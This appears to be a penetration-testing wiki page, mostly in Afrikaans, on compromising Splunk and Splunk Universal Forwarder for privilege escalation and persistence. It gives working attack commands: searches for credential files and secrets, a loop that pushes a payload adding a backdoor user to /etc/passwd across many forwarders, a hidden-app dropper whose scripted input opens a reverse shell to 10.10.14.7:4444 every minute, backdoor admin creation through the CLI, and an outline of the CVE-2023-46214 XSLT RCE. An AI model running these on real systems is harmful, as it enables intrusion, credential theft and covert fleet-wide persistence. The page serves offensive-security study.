# Splunk LPE and Persistence

As jy ’n masjien **intern** of **ekstern** **enumerate** en jy vind **Splunk running** (gewoonlik **8000** vir die web-UI en **8089** vir die management API), kan geldige credentials dikwels deur app installation, scripted inputs of management actions in **code execution** omskep word.<sup>[[1]](#references)[[5]](#references)[[6]](#references)[[10]](#references)</sup> As Splunk as **root** loop, lei dit dikwels onmiddellik tot **privilege escalation**.<sup>[[1]](#references)</sup>

As jy slegs die generiese remote attack surface, enumeration of app-upload RCE path benodig, kyk na:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

As jy **reeds root** is en die Splunk-diens nie slegs op localhost luister nie, kan jy ook **Splunk password hashes** steel, **encrypted secrets** recover, of ’n **malicious app** push om plaaslik of oor verskeie forwarders persistence te behou.<sup>[[7]](#references)[[8]](#references)[[11]](#references)</sup>

## Interessante Plaaslike Lêers

Wanneer jy op ’n host land waarop Splunk of Splunk Universal Forwarder loop, is hierdie gewoonlik die interessantste paths:<sup>[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
Belangrike artefakte:

- **`$SPLUNK_HOME/etc/passwd`**: plaaslike Splunk-gebruikers en wagwoord-hashes.<sup>[[7]](#references)</sup>
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: sleutel wat deur Splunk gebruik word om secrets wat in verskeie `.conf`-lêers gestoor word, te enkripteer.<sup>[[8]](#references)</sup>
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: aanvanklike admin-bootstraplêer; nuttig in golden images en gevalle van provisioning-foute. Dit word geïgnoreer indien `etc/passwd` reeds bestaan.<sup>[[9]](#references)</sup>
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: waar scripted inputs gewoonlik geaktiveer word.<sup>[[10]](#references)</sup>
- **`$SPLUNK_HOME/etc/deployment-apps/`** of **`$SPLUNK_HOME/etc/apps/`**: goeie plekke om ’n persistente app weg te steek of te hersien wat reeds versprei word.<sup>[[11]](#references)</sup>

## Splunk Universal Forwarder Agent Exploit Summary

Vir verdere besonderhede, kyk na [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Dit is slegs ’n opsomming.<sup>[[1]](#references)</sup>

**Exploit-oorsig:**
’n Exploit wat die Splunk Universal Forwarder (UF) teiken, stel aanvallers met die **agent password** in staat om arbitrêre kode uit te voer op stelsels waarop die agent loop, wat moontlik ’n groot deel van die omgewing kan kompromitteer.<sup>[[1]](#references)</sup>

**Waarom dit werk:**

- Die UF-bestuursdiens word gewoonlik op **TCP 8089** blootgestel.<sup>[[6]](#references)</sup>
- Aanvallers kan by die API autentiseer en die forwarder opdrag gee om ’n **malicious app bundle** te installeer.<sup>[[1]](#references)[[5]](#references)</sup>
- Dieselfde primitive kan plaaslik vir **LPE** of op afstand vir **RCE** gebruik word.<sup>[[5]](#references)</sup>
- Publieke tooling soos **SplunkWhisperer2** skep die app bundle outomaties en kan payloads vir Linux-teikens aanpas.<sup>[[5]](#references)</sup>

**Algemene maniere om die wagwoord te herwin:**

- Cleartext credentials in dokumentasie, scripts, shares of deployment-automation.<sup>[[1]](#references)</sup>
- Wagwoord-hashes binne `$SPLUNK_HOME/etc/passwd`, gevolg deur offline cracking.<sup>[[1]](#references)[[7]](#references)</sup>
- Golden images of provisioning-oorskiet soos `user-seed.conf`.<sup>[[1]](#references)[[9]](#references)</sup>

**Impak:**

- SYSTEM/root-vlak-kode-uitvoering op elke gekompromitteerde host.<sup>[[1]](#references)</sup>
- Ontplooiing van persistente apps, backdoors of ransomware.<sup>[[1]](#references)</sup>
- Deaktivering of manipulering van telemetry voordat die data aangestuur word.<sup>[[1]](#references)</sup>

**Voorbeeldopdrag vir exploitation:**

Die oorspronklike verslag demonstreer die volgende loop om ’n payload na verskeie forwarders te stuur.<sup>[[1]](#references)</sup>
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Bruikbare publieke exploits:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Persistence via Scripted Inputs or Malicious Apps

As jy **filesystem write access** as `root`/`splunk`, of authenticated access het om apps te installeer, is ’n baie betroubare persistence-meganisme om ’n **custom app** met ’n **scripted input** te plaas.<sup>[[2]](#references)[[5]](#references)[[10]](#references)</sup> Splunk se eie dokumentasie verwag dat scripted inputs binne ’n app-directory geleë is en vanuit `inputs.conf` geaktiveer word.<sup>[[10]](#references)</sup>

Tipiese uitleg:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
Minimale `inputs.conf`:<sup>[[10]](#references)</sup>
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Vinnige Linux-dropper (met behulp van daardie gedokumenteerde app-uitleg):<sup>[[10]](#references)</sup>
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Notas:

- Dieselfde trick werk op **Universal Forwarder** deur `/opt/splunkforwarder/etc/apps/` te gebruik.<sup>[[2]](#references)[[10]](#references)</sup>
- Attackers meng dikwels in deur ’n legitieme add-on te wysig in plaas daarvan om ’n ooglopend malicious app te skep.<sup>[[2]](#references)</sup>
- Op ’n **deployment server** verander die plant van ’n malicious app binne `deployment-apps/` in **fleet-wide persistence**, omdat forwarders poll, opgedateerde apps aflaai en dikwels herbegin om dit toe te pas.<sup>[[11]](#references)[[12]](#references)</sup>

## Geloofsbriefdiefstal en Admin-oorname

As jy Splunk se plaaslike lêers kan lees, is daar gewoonlik twee goeie doelwitte: herstel **Splunk admin-toegang** en herstel **encrypted service credentials**.<sup>[[8]](#references)</sup>

### Wagwoord-hashes en plaaslike gebruikers

Splunk stoor plaaslike authentication-data in `etc/passwd`. Afhangend van die deployment, kan die cracking van daardie lêer werkende credentials vir die web-UI en die management API oplewer.<sup>[[1]](#references)[[7]](#references)</sup>

As jy reeds geldige **admin**-credentials het en Splunk sy **native** authentication-backend gebruik, kan die CLI self vir persistence gebruik word.<sup>[[13]](#references)</sup>
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` en encrypted values

Splunk gebruik `etc/auth/splunk.secret` om sensitiewe waardes te beskerm wat in verskeie konfigurasielêers gestoor word. As jy beide die **secret** en die relevante **`.conf`-lêers** kan steel, kan jy dikwels die volgende herwin of hergebruik:<sup>[[8]](#references)</sup>

- gedeelde forwarder/indexer-secrets soos `pass4SymmKey`
- wagwoorde vir TLS private keys soos `sslPassword`
- LDAP-bind credentials soos `bindDNPassword`

Dit kan **lateral movement** ondersteun, selfs wanneer die Splunk admin-wagwoord self nie crackable is nie.<sup>[[8]](#references)</sup>

### Misbruik van `user-seed.conf`

`user-seed.conf` word slegs tydens die eerste opstart gebruik, of wanneer `etc/passwd` nie bestaan nie. Dit maak dit minder nuttig op ’n live system, maar baie interessant in:<sup>[[9]](#references)</sup>

- gekompromitteerde installasietemplates
- container images
- unattended provisioning-workflows
- appliances waar Splunk outomaties geherinitialiseer word

In daardie gevalle gee die plaas van ’n `HASHED_PASSWORD` wat met `splunk hash-passwd` gegenereer is, jou ’n stil manier om admin access ná redeployment te herwin.<sup>[[9]](#references)</sup>

## Misbruik van Splunk Queries

Vir verdere besonderhede, kyk na [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis).<sup>[[3]](#references)[[4]](#references)</sup>

’n Nuttige onlangse tegniek is om **user-supplied XSLT** in kwesbare Splunk Enterprise-weergawes te misbruik om ’n geauthentiseerde account met lae privileges in **OS command execution** as die `splunk`-user te verander.<sup>[[3]](#references)[[4]](#references)</sup>

Hoëvlakvloei:<sup>[[3]](#references)[[4]](#references)</sup>

1. Authenticate by Splunk.
2. Upload ’n kwaadwillige **XSL**-lêer deur die preview/upload-funksionaliteit.
3. Laat Splunk search results render met daardie opgelaaide stylesheet vanuit die **dispatch**-directory.
4. Gebruik die XSLT-payload om ’n lêer te skryf of execution deur Splunk se search pipeline te trigger (byvoorbeeld deur interne funksionaliteit soos `runshellscript` te bereik).

Die belangrikste offensive takeaway is dat hierdie pad **post-auth RCE sonder app upload** is. Op Linux beland jy gewoonlik in die **`splunk`-account**, wat steeds waardevol is omdat daardie user dikwels die application tree besit, secrets kan lees en persistent apps kan plant wat shell loss oorleef.<sup>[[3]](#references)[[4]](#references)</sup>

’n Verteenwoordigende path wat tydens exploitation gebruik word, is:<sup>[[4]](#references)</sup>
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
As Splunk met te veel voorregte loop, of as die `splunk`-gebruiker toegang het tot gevaarlike scripts, skryfbare service units of swak `sudo`-reëls, word dit 'n eenvoudige **LPE**-ketting.

## References

- [1] [Misbruik van Splunk Forwarders vir RCE en Persistence](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)
- [2] [Pasop vir TraitorWare: Gebruik van Splunk vir Persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
- [3] [Splunk-sekuriteitsadvies SVD-2023-1104 – XSLT Injection RCE (CVE-2023-46214)](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [4] [CVE-2023-46214-analise: Splunk XSLT Injection RCE](https://blog.hrncirik.net/cve-2023-46214-analysis)
- [5] [SplunkWhisperer2/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [6] [Verander verstekwaardes](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/10.2/start-splunk-enterprise-and-perform-initial-tasks/change-default-values)
- [7] [authentication.conf](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/10.4/configuration-file-reference/10.4.0-configuration-file-reference/authentication.conf)
- [8] [Ontplooi veilige wagwoorde oor verskeie bedieners](https://help.splunk.com/en/splunk-enterprise/administer/manage-users-and-security/10.4/install-splunk-enterprise-securely/deploy-secure-passwords-across-multiple-servers)
- [9] [user-seed.conf](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/9.2/configuration-file-reference/9.2.6-configuration-file-reference/user-seed.conf)
- [10] [Stel 'n scripted input op](https://help.splunk.com/en/splunk-enterprise/developing-views-and-apps-for-splunk-web/10.0/build-scripted-inputs/setting-up-a-scripted-input)
- [11] [Skep deployment apps](https://help.splunk.com/splunk-enterprise/administer/update-your-deployment/9.4/configure-the-deployment-system/create-deployment-apps)
- [12] [Hoe deployment-opdaterings plaasvind](https://help.splunk.com/en/splunk-enterprise/administer/update-your-deployment/9.2/deployment-server-and-forwarder-management/how-deployment-updates-happen)
- [13] [Konfigureer gebruikers met die CLI](https://help.splunk.com/en/splunk-enterprise/administer/manage-users-and-security/9.4/perform-advanced-user-and-role-management-in-splunk-enterprise/configure-users-with-the-cli)
{{#include ../../banners/hacktricks-training.md}}
